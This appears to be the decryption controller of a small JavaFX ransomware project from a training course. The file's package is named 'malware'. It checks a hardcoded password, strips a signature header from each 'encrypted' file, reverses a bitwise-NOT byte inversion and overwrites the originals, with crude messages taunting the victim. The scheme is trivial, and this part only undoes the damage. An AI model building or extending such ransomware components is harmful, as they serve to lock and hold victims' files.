package lk.ijse.dep10.malware.controller;

import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Alert;
import javafx.scene.control.Button;
import javafx.scene.control.TextField;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.List;

public class MainSceneController {

    @FXML
    private Button btnDecrypt;

    @FXML
    private TextField txtPassword;

    private ArrayList<File> encryptedFileList = new ArrayList<>();

    public void initData(ArrayList<File> encryptedFileList){
        this.encryptedFileList = encryptedFileList;
    }

    @FXML
    void btnDecryptOnAction(ActionEvent event) throws IOException {
        final String SIGNATURE = "You fucked up man...!";

        if (txtPassword.getText().equals("IJSE")){

            for (File file : encryptedFileList) {

                File tempFile = File.createTempFile("decrypt-", "");
                FileOutputStream fos = new FileOutputStream(tempFile);
                FileInputStream fis = new FileInputStream(file);

                byte[] buffer = new byte[SIGNATURE.length()];
                fis.read(buffer);

                while (true){
                    buffer = new byte[1024 * 10];
                    int read = fis.read(buffer);
                    if (read == -1) break;
                    for (int i = 0; i < read; i++) {
                        buffer[i] = (byte) ~buffer[i];
                    }
                    fos.write(buffer, 0, read);
                }

                fos.close();
                fis.close();

                file.delete();
                tempFile.renameTo(file);
            }

            new Alert(Alert.AlertType.INFORMATION, "All files have been decrypted.. bye bye..!").showAndWait();
            System.exit(0);
        }else{
            new Alert(Alert.AlertType.ERROR, "Salli daala idapan yako!").show();
            txtPassword.requestFocus();
            txtPassword.selectAll();
        }
    }

}
